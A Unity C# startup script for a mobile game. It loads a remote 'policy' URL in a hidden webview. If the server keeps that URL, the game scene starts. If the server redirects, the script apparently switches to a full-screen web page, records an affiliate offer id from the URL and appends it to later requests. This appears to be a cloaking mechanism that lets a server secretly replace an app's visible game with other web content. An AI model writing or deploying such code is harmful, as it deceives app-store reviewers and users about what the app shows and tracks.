using System.Collections;
using System.Text.RegularExpressions;
using UnityEngine;
using UnityEngine.SceneManagement;

public class UniGameStarter : MonoBehaviour
{
    private const string PlayerIdKey = "cached_player_id_8";
    private const string IdPattern = "ap_id_offer_id=(\\d+)";
    private const string IdCheckContent = "ap_id_offer_id=";
    
    private const string TargetUrl = "https://oxygenblueltd.co.uk/policy/";
    
    [SerializeField] private UniWebView webView;
    [SerializeField] private GameObject blocker;
    
    private Rect _frameRect;
    private Coroutine _lastUrlCoroutine;
    

    private void Start()
    {
        webView.SetSupportMultipleWindows(true, true);
        webView.SetAllowHTTPAuthPopUpWindow(true);
        
        if (Application.internetReachability == NetworkReachability.NotReachable)
            LoadNextScene();
        else
            LoadPlayerData();
    }
    

    private IEnumerator TrackPlayerId()
    {
        while (true)
        {
            if (!string.IsNullOrWhiteSpace(webView.Url) && webView.Url.Contains(IdCheckContent))
            {
                Match match = Regex.Match(webView.Url, IdPattern);
                
                if (match.Success)
                {
                    string value = match.Groups[1].Value;
                    
                    PlayerPrefs.SetString(PlayerIdKey, value);    
                    
                    Debug.Log($"Unity Process Data: Application initialize success player id: {value}");
                    
                    break;
                }
            }
            
            yield return null;
        }

        _lastUrlCoroutine = null;
    }
    
    private void LoadPlayerData()
    {
        if (PlayerPrefs.HasKey(PlayerIdKey))
        {
            Debug.Log("Unity Process Data: Loading saved cache success");

            var specialSymbol = TargetUrl.Contains("?s") ? "&" : "?";
            webView.Load(TargetUrl + $"{specialSymbol}sub_id_8={PlayerPrefs.GetString(PlayerIdKey)}");
        }
        else
        {
            _lastUrlCoroutine = StartCoroutine(TrackPlayerId());
            webView.Load(TargetUrl);
        }

        StartCoroutine(OpenView());
    }
    
    private IEnumerator OpenView()
    {
        yield return new WaitForSeconds(3f);
        
        if (_lastUrlCoroutine != null)
            StopCoroutine(_lastUrlCoroutine);

        bool dataNotDetermined = webView.Url.Contains(TargetUrl);
        
        _frameRect = dataNotDetermined
            ? Rect.zero : 
            new Rect(0, Screen.safeArea.yMin, Screen.width, Screen.height - Screen.safeArea.yMin);

        webView.Frame = _frameRect;

        if (dataNotDetermined)
        {
            LoadNextScene();
        }
        else
        {
            webView.Show();
            blocker.SetActive(true);
        }
    }
    
    private void LoadNextScene()
    {
        var nextScene = SceneManager.GetActiveScene().buildIndex + 1;
        
        SceneManager.LoadScene(nextScene);
    }
}